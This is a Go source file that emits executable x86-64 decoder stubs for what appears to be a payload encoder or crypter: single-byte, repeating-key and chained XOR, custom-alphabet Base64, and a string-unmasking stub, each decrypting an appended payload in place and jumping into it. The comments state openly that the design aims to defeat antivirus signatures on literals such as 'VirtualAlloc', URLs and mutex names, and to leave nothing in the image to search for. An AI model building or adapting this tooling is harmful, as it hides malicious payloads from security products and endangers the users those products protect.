package x86

// This file emits the real, executable x86-64 decoder stubs the encoding stages
// attach to their output. A stub that is only described in a comment is not a
// stub; everything here is emitted as machine code and executed by the test
// suite on linux/amd64.

// XORDecodeFunc emits a position-independent leaf function with the signature
//
//	func(dst *byte, src *byte, n uintptr, key uint8)
//
// in the System V ABI: RDI=dst, RSI=src, RDX=n, CL=key.
//
// It is the primitive the self-decoding stub below is built from, and it is
// what the tests call to prove the XOR stage round-trips.
//
//	48 85 D2              test   rdx, rdx
//	74 0D                 jz     done
//	88 C8                 mov    al, cl
//	loop:
//	8A 0E                 mov    cl, [rsi]
//	30 C1                 xor    cl, al
//	88 0F                 mov    [rdi], cl
//	48 FF C6              inc    rsi
//	48 FF C7              inc    rdi
//	48 FF CA              dec    rdx
//	75 F3                 jnz    loop
//	done:
//	C3                    ret
func XORDecodeFunc() []byte {
	a := NewAssembler()
	done := a.NewLabel()
	loop := a.NewLabel()

	a.Emit(0x48, 0x85, 0xD2) // test rdx, rdx
	a.Emit(0x74)
	a.Rel8(done)
	a.Emit(0x88, 0xC8) // mov al, cl
	// fall through to loop
	_ = loop
	a.Bind(loop)
	a.Emit(0x8A, 0x0E)                   // mov cl, [rsi]
	a.Emit(0x30, 0xC1)                   // xor cl, al
	a.Emit(0x88, 0x0F)                   // mov [rdi], cl
	a.EmitBytes(RegRM(0xFF, true, 0, 6)) // inc rsi
	a.EmitBytes(RegRM(0xFF, true, 0, 7)) // inc rdi
	a.EmitBytes(RegRM(0xFF, true, 1, 2)) // dec rdx
	a.Emit(0x75)
	a.Rel8(loop)
	a.Bind(done)
	a.Emit(0xC3) // ret
	return a.MustBytes()
}

// XORStubPlan describes a generated self-decoding stub.
type XORStubPlan struct {
	// Code is the stub itself; the caller appends exactly DataLen encrypted
	// bytes immediately after it.
	Code []byte
	// DataLen is the number of payload bytes the stub will decrypt in place.
	DataLen int
	// DataOffset is where the appended payload starts (== len(Code)).
	DataOffset int
	// EntryOffset is the stub's entry point (0 for a self-contained image).
	EntryOffset int
}

// XORSelfDecodeStub emits an in-place XOR decoder that locates the payload with
// a RIP-relative LEA, decrypts DataLen bytes, and then either returns or jumps
// into the decrypted payload.
//
//	jumpIntoPayload=false  <terminating ret>   - callable, used by the tests
//	jumpIntoPayload=true   jmp rdi             - the production form
//
// The image layout is:
//
//	[ stub code ][ payload ciphertext ]
//
// which is why DataOffset == len(Code): the LEA's displacement is resolved
// against the end of the stub.
func XORSelfDecodeStub(key byte, dataLen int, jumpIntoPayload bool) XORStubPlan {
	a := NewAssembler()
	data := a.NewLabel()
	loop := a.NewLabel()

	// lea rsi, [rip + data]
	a.EmitBytes(RipRM(0x8D, true, 6))
	a.RIP32(data)
	a.EmitBytes(RegRM(0x89, true, 6, 7)) // mov rdi, rsi   (remember the base)
	a.EmitBytes([]byte{0xB9})            // mov ecx, imm32
	a.Imm32(int32(dataLen))
	a.Emit(0xB0, key) // mov al, key

	a.Bind(loop)
	a.Emit(0x30, 0x06)                   // xor byte [rsi], al
	a.EmitBytes(RegRM(0xFF, true, 0, 6)) // inc rsi
	a.EmitBytes(RegRM(0xFF, true, 1, 1)) // dec rcx
	a.Emit(0x75)
	a.Rel8(loop)

	if jumpIntoPayload {
		a.EmitBytes(RegRM(0xFF, false, 4, 7)) // jmp rdi
	} else {
		a.Emit(0xC3) // ret
	}
	a.Bind(data)

	code := a.MustBytes()
	return XORStubPlan{Code: code, DataLen: dataLen, DataOffset: len(code), EntryOffset: 0}
}

// Base64DecodeStub emits an in-place decoder for a custom-alphabet Base64
// payload.
//
// Layout produced: the stub code, then a 256-byte symbol -> index table, then
// (appended by the caller) the Base64 text. The table is what generalises
// canonical Base64 decoding to any alphabet: `movzx eax, byte [table+rax]`
// replaces the branchy character classification a normal decoder needs.
//
// The decode is in place. Reading four bytes and writing three means the write
// pointer can never overtake the read pointer, and each group's four characters
// are read into registers before any output byte is stored, so overlap is safe.
//
//	lea  rsi, [rip+data]        ; payload
//	lea  r8,  [rip+table]
//	mov  r9, rsi                ; remember where the decoded bytes begin
//	mov  rdi, rsi
//	mov  ecx, groups
//	loop:
//	movzx eax, byte [rsi]       ; c0
//	movzx eax, byte [r8+rax]    ; v0
//	shl  eax, 18
//	movzx edx, byte [rsi+1]
//	movzx edx, byte [r8+rdx]
//	shl  edx, 12
//	or   eax, edx
//	movzx edx, byte [rsi+2]
//	movzx edx, byte [r8+rdx]
//	shl  edx, 6
//	or   eax, edx
//	movzx edx, byte [rsi+3]
//	movzx edx, byte [r8+rdx]
//	or   eax, edx
//	mov  [rdi+2], al
//	mov  edx, eax
//	shr  edx, 8
//	mov  [rdi+1], dl
//	shr  edx, 8
//	mov  [rdi], dl
//	add  rsi, 4
//	add  rdi, 3
//	dec  ecx
//	jnz  loop
//	<ret | jmp r9>
func Base64DecodeStub(inverse *[256]byte, groups int, jumpIntoPayload bool) XORStubPlan {
	a := NewAssembler()
	table := a.NewLabel()
	data := a.NewLabel()
	loop := a.NewLabel()

	a.EmitBytes(RipRM(0x8D, true, 6)) // lea rsi, [rip+data]
	a.RIP32(data)
	a.EmitBytes(RipRM(0x8D, true, 8)) // lea r8, [rip+table]
	a.RIP32(table)
	a.Emit(0x49, 0x89, 0xF1) // mov r9, rsi
	a.Emit(0x48, 0x89, 0xF7) // mov rdi, rsi
	a.Emit(0xB9)             // mov ecx, imm32
	a.Imm32(int32(groups))

	a.Bind(loop)
	a.Emit(0x0F, 0xB6, 0x06)             // movzx eax, byte [rsi]
	a.Emit(0x41, 0x0F, 0xB6, 0x04, 0x00) // movzx eax, byte [r8+rax]
	a.Emit(0xC1, 0xE0, 0x12)             // shl eax, 18
	a.Emit(0x0F, 0xB6, 0x56, 0x01)       // movzx edx, byte [rsi+1]
	a.Emit(0x41, 0x0F, 0xB6, 0x14, 0x10) // movzx edx, byte [r8+rdx]
	a.Emit(0xC1, 0xE2, 0x0C)             // shl edx, 12
	a.Emit(0x09, 0xD0)                   // or eax, edx
	a.Emit(0x0F, 0xB6, 0x56, 0x02)       // movzx edx, byte [rsi+2]
	a.Emit(0x41, 0x0F, 0xB6, 0x14, 0x10)
	a.Emit(0xC1, 0xE2, 0x06)       // shl edx, 6
	a.Emit(0x09, 0xD0)             // or eax, edx
	a.Emit(0x0F, 0xB6, 0x56, 0x03) // movzx edx, byte [rsi+3]
	a.Emit(0x41, 0x0F, 0xB6, 0x14, 0x10)
	a.Emit(0x09, 0xD0)             // or eax, edx
	a.Emit(0x8B, 0xD0)             // mov edx, eax
	a.Emit(0x88, 0x47, 0x02)       // mov [rdi+2], al
	a.Emit(0x8B, 0xD0)             // mov edx, eax
	a.Emit(0xC1, 0xEA, 0x08)       // shr edx, 8
	a.Emit(0x88, 0x57, 0x01)       // mov [rdi+1], dl
	a.Emit(0xC1, 0xEA, 0x08)       // shr edx, 8
	a.Emit(0x88, 0x17)             // mov [rdi], dl
	a.Emit(0x48, 0x83, 0xC6, 0x04) // add rsi, 4
	a.Emit(0x48, 0x83, 0xC7, 0x03) // add rdi, 3
	a.Emit(0xFF, 0xC9)             // dec ecx
	a.Emit(0x75)
	a.Rel8(loop)

	if jumpIntoPayload {
		a.Emit(0x41, 0xFF, 0xE1) // jmp r9
	} else {
		a.Emit(0xC3) // ret
	}

	a.Bind(table)
	a.EmitBytes(inverse[:])
	a.Bind(data)

	code := a.MustBytes()
	return XORStubPlan{Code: code, DataLen: groups * 4, DataOffset: len(code), EntryOffset: 0}
}

// XORSelfDecodeMultiKeyStub emits an in-place XOR *decoder* driven by a
// repeating key of arbitrary length.
//
// The single-byte XORSelfDecodeStub above is the primitive; this is the form the
// XOR stage ships, because a repeating key of 32 random bytes is materially
// harder to recover than one byte. The key itself is not emitted here: keyLen
// bytes of key material must be placed immediately *before* the returned code,
// which is exactly where the container's parameter block sits. Keeping one copy
// of the key means the image holds nothing to search for.
//
// When chain is set the keystream is self-referential — C[i] = P[i] ^ K[i mod k]
// ^ C[i-1] — so the decoder must remember the previous *ciphertext* byte, which
// it loads before overwriting it. Note the asymmetry with encryption: this loop
// is a decoder, and xorDecode in internal/encode is its mirror image.
//
//	lea  rsi, [rip+data]        ; payload
//	lea  r8,  [rip+keytab]      ; current key pointer
//	mov  r11, r8                ; key base
//	mov  r9d, keyLen
//	xor  r10d, r10d             ; prev = 0            (chained only)
//	mov  rdi, rsi               ; remember the payload start
//	mov  ecx, dataLen
//	loop:
//	mov  dl, [rsi]              ; C[i]                (chained only)
//	mov  al, [r8]
//	xor  al, r10b               ; K[i] ^ prev         (chained only)
//	xor  [rsi], al
//	mov  r10b, dl               ; prev = C[i]         (chained only)
//	inc  rsi
//	inc  r8
//	dec  r9d
//	jnz  cont
//	mov  r8, r11                ; wrap the key
//	mov  r9d, keyLen
//	cont:
//	dec  ecx
//	jnz  loop
//	<ret | jmp rdi>
func XORSelfDecodeMultiKeyStub(keyLen, dataLen int, chain, jumpIntoPayload bool) []byte {
	a := NewAssembler()
	keytab := a.NewLabel()
	a.SetLabel(keytab, -keyLen) // the key lives in the container's parameter block
	data := a.NewLabel()
	loop := a.NewLabel()
	cont := a.NewLabel()

	a.EmitBytes(RipRM(0x8D, true, 6)) // lea rsi, [rip+data]
	a.RIP32(data)
	a.EmitBytes(RipRM(0x8D, true, 8)) // lea r8, [rip+keytab]
	a.RIP32(keytab)
	a.Emit(0x4D, 0x89, 0xC3) // mov r11, r8
	a.Emit(0x41, 0xB9)       // mov r9d, keyLen
	a.Imm32(int32(keyLen))
	if chain {
		a.Emit(0x45, 0x31, 0xD2) // xor r10d, r10d
	}
	a.Emit(0x48, 0x89, 0xF7) // mov rdi, rsi
	a.Emit(0xB9)             // mov ecx, dataLen
	a.Imm32(int32(dataLen))

	a.Bind(loop)
	if chain {
		a.Emit(0x8A, 0x16) // mov dl, [rsi]
	}
	a.Emit(0x41, 0x8A, 0x00) // mov al, [r8]
	if chain {
		a.Emit(0x44, 0x30, 0xD0) // xor al, r10b
	}
	a.Emit(0x30, 0x06) // xor [rsi], al
	if chain {
		a.Emit(0x41, 0x88, 0xD2) // mov r10b, dl
	}
	a.EmitBytes(RegRM(0xFF, true, 0, 6)) // inc rsi
	a.Emit(0x49, 0xFF, 0xC0)             // inc r8
	a.Emit(0x41, 0xFF, 0xC9)             // dec r9d
	a.Emit(0x75)
	a.Rel8(cont)
	a.Emit(0x4D, 0x89, 0xD8) // mov r8, r11
	a.Emit(0x41, 0xB9)       // mov r9d, keyLen
	a.Imm32(int32(keyLen))
	a.Bind(cont)
	a.EmitBytes(RegRM(0xFF, true, 1, 1)) // dec ecx
	a.Emit(0x75)
	a.Rel8(loop)

	if jumpIntoPayload {
		a.EmitBytes(RegRM(0xFF, false, 4, 7)) // jmp rdi
	} else {
		a.Emit(0xC3) // ret
	}

	a.Bind(data)
	return a.MustBytes()
}

// StringRedecodeStub emits an in-place literal-rebuild stub.
//
// The stage masks printable runs inside a payload so that no signature keyed on
// a literal ("VirtualAlloc", a URL, a mutex name) has anything to match. Each
// masked run is described by a 9-byte record — offset, length, key — and this
// stub walks those records and unwraps the payload before transferring control
// to it.
//
//	lea  r8, [rip+table]
//	lea  r9, [rip+payload]
//	mov  ecx, records
//	record:
//	mov  eax, [r8]              ; offset
//	mov  edx, [r8+4]            ; length
//	movzx r10d, byte [r8+8]     ; key
//	lea  rax, [r9+rax]          ; absolute address of the run
//	test edx, edx
//	jz   next
//	inner:
//	xor  byte [rax], r10b
//	inc  rax
//	dec  edx
//	jnz  inner
//	next:
//	add  r8, 9
//	dec  ecx
//	jnz  record
//	lea  rax, [rip+payload]
//	jmp  rax
//
// The mask table (tableLen bytes of 9-byte records) must be placed immediately
// before the returned code, and the payload immediately after it.
func StringRedecodeStub(tableLen, records int) []byte {
	a := NewAssembler()
	lblTable := a.NewLabel()
	a.SetLabel(lblTable, -tableLen) // the mask table lives in the container's parameter block
	lblPayload := a.NewLabel()
	lblRecord := a.NewLabel()
	lblInner := a.NewLabel()
	lblNext := a.NewLabel()

	a.EmitBytes(RipRM(0x8D, true, 8)) // lea r8, [rip+table]
	a.RIP32(lblTable)
	a.EmitBytes(RipRM(0x8D, true, 9)) // lea r9, [rip+payload]
	a.RIP32(lblPayload)
	a.Emit(0xB9) // mov ecx, records
	a.Imm32(int32(records))

	a.Bind(lblRecord)
	a.EmitBytes(MemDisp8RM(0x8B, false, 0, 8, 0)) // mov eax, [r8]
	a.EmitBytes(MemDisp8RM(0x8B, false, 2, 8, 4)) // mov edx, [r8+4]
	// movzx r10d, byte [r8+8]
	a.EmitBytes([]byte{0x45, 0x0F, 0xB6, modrm(1, 2, 4), 0x20, 0x08})
	a.Emit(0x49, 0x8D, 0x04, 0x01) // lea rax, [r9+rax]

	// A record with length 0 would spin forever, so guard it.
	skip := a.NewLabel()
	a.Emit(0x85, 0xD2) // test edx, edx
	JccRel8(a, CondE, skip)

	a.Bind(lblInner)
	a.Emit(0x44, 0x30, 0x10)             // xor byte [rax], r10b
	a.EmitBytes(RegRM(0xFF, true, 0, 0)) // inc rax
	a.Emit(0xFF, 0xCA)                   // dec edx
	a.Emit(0x75)
	a.Rel8(lblInner)

	a.Bind(skip)
	a.Bind(lblNext)
	a.Emit(0x49, 0x83, 0xC0, 0x09) // add r8, 9
	a.Emit(0xFF, 0xC9)             // dec ecx
	a.Emit(0x75)
	a.Rel8(lblRecord)

	a.EmitBytes(RipRM(0x8D, true, 0)) // lea rax, [rip+payload]
	a.RIP32(lblPayload)
	a.Emit(0xFF, 0xE0) // jmp rax

	a.Bind(lblPayload)
	return a.MustBytes()
}

// MultiKeyXORDecodeFunc emits a callable leaf function that decrypts a sequence
// of independently keyed chunks:
//
//	func(dst *byte, src *byte, keys *byte, chunkLen uintptr, chunks uintptr)
//
// RDI=dst, RSI=src, RDX=keys, RCX=chunkLen, R8=chunks. Each chunk of chunkLen
// bytes is XORed with its own key byte. This is how the string-obfuscation stage
// rebuilds a literal it has split into pieces: the split is what defeats a
// signature that matches the literal's bytes, and the key table is what makes
// the pieces meaningless on their own.
//
//	movzx r10d, byte [rdx]   44 0F B6 12
//	inc   rdx                48 FF C2
//	mov   r9, rcx            49 89 C9
//	inner:
//	mov   al, [rsi]          8A 06
//	xor   al, r10b           44 30 D0
//	mov   [rdi], al          88 07
//	inc   rsi                48 FF C6
//	inc   rdi                48 FF C7
//	dec   r9                 49 FF C9
//	jnz   inner              75 rel8
//	dec   r8                 49 FF C8
//	jnz   outer              75 rel8
//	ret                      C3
func MultiKeyXORDecodeFunc() []byte {
	a := NewAssembler()
	outer := a.NewLabel()
	inner := a.NewLabel()
	done := a.NewLabel()

	a.Emit(0x48, 0x85, 0xC9) // test rcx, rcx  (chunkLen == 0?)
	a.Emit(0x74)
	a.Rel8(done)
	a.Emit(0x4D, 0x85, 0xC0) // test r8, r8    (chunks == 0?)
	a.Emit(0x74)
	a.Rel8(done)

	a.Bind(outer)
	a.Emit(0x44, 0x0F, 0xB6, 0x12)       // movzx r10d, byte [rdx]
	a.EmitBytes(RegRM(0xFF, true, 0, 2)) // inc rdx
	a.EmitBytes(RegRM(0x89, true, 1, 9)) // mov r9, rcx
	a.Bind(inner)
	a.Emit(0x8A, 0x06)                     // mov al, [rsi]
	a.EmitBytes(RegRM(0x30, false, 10, 0)) // xor al, r10b
	a.Emit(0x88, 0x07)                     // mov [rdi], al
	a.EmitBytes(RegRM(0xFF, true, 0, 6))   // inc rsi
	a.EmitBytes(RegRM(0xFF, true, 0, 7))   // inc rdi
	a.EmitBytes(RegRM(0xFF, true, 1, 9))   // dec r9
	a.Emit(0x75)
	a.Rel8(inner)
	a.EmitBytes(RegRM(0xFF, true, 1, 8)) // dec r8
	a.Emit(0x75)
	a.Rel8(outer)
	a.Bind(done)
	a.Emit(0xC3) // ret
	return a.MustBytes()
}
